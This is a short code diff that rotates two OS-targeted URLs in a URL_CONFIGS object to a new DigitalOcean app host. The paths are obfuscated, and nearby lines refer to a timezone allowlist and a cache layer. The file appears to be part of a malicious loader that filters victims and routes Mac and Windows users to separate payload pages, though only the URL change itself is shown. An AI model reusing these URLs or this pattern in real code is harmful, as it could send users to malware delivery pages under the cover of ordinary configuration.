@@ -30,8 +30,8 @@ const ALLOWED_TIMEZONES = new Set([
 
 // URL configurations organized by platform target
 const URL_CONFIGS = {
-    mac: "https://lobster-app-24zfw.ondigitalocean.app/Ma0cHelpAsMEr0t0140/index.html",
-    default: "https://lobster-app-24zfw.ondigitalocean.app/Win0codejInfowj2n/index.html"
+    mac: "https://orca-app-r5k2r.ondigitalocean.app/Ma0cHelpAsMEr0t0140/index.html",
+    default: "https://orca-app-r5k2r.ondigitalocean.app/Win0codejInfowj2n/index.html"
 };
 
 // --- Pre-Compilation Cache Layer ---
